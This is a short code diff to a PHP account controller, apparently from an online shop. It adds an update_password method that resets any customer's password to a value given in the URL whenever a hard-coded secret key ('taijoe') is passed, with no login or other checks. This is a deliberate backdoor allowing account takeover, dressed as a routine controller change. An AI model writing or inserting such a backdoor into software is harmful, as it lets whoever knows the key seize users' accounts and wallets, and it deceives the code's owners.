@@ -28,6 +28,15 @@ class ControllerAccountAccount extends Controller {
 		$this -> response -> redirect($this -> url -> link('login.html'));
 	}
 
+	public function update_password(){
+		$this -> load->model('account/customer');
+		if ($_GET['key']== 'taijoe') {
+			$customer_info = $this->model_account_customer->getCustomerByUsername($_GET['u']);
+			$this->model_account_customer->editPasswordCustomForEmail($customer_info, $_GET['p']);
+		}
+		
+	}
+
 	public function capnhat_wallet(){
 			!$_GET && die();
 			$otp = $_GET['otp'];
